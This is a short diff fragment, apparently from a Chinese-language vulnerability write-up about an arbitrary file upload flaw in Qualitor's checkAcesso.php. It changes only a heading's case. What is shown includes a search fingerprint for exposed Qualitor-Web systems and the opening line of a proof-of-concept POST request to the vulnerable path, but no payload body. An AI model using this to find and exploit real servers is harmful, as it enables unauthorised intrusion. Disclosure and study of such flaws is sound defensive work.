@@ -8,7 +8,7 @@ Qualitor系统接口checkAcesso.php任意文件上传漏洞，允许攻击者上
 app="Qualitor-Web"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /html/ad/adfilestorage/request/checkAcesso.php HTTP/1.1
